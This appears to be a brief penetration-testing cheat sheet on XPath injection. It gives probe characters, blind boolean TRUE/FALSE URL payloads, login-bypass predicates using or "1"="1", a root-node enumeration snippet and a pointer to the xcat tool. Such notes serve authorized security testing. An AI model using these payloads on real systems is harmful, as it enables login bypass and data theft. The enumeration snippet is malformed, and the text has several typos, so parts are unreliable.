# Simple checks for vulnerable XPATH

### Check if there is any behavioral difference in the responses
```
You could use ' (apostrophe) or , (Comma)
```

Apostrophe used as string terminator

Comma used to break intergers, althorugh any character would work

```
http://<website>/vulnpage.php?countryID=a'
```

### Blind bolean injection
You can check if there is a valid injection by checking with commands if there is no error messages. You can check whenether you get a valid response back or not depending on if it's TRUE or FALSE
```
## TRUE 
http://<website>/vulnpage.php?countryID=999999 or 1=1
http://<website>/vulnpage.php?countryID=999999 or "2" or "2"
## FALSE
http://<website>/vulnpage.php?countryID=999999 or 1=2
http://<website>/vulnpage.php?countryID=999999 or "1"="2"
## Double or (to bypass when not nothing username and password is required)
//<someNode>[username='' or "1"="1" or "1"="1" and password='']
## Password injection parameter.
//<someNode>[username='' and password='' or "1"="1"]
```

### Finding Root Node Identifier

```bash
' or substring(name(/*[*))'
```

# Enumerate Blind Bolean injections with xcat
You can see here how to use xcat (Tool for injection auto blind bolean to extract) 

[[Xcat]]

### Useful XPath statements
![[Pasted image 20220217090452.png]]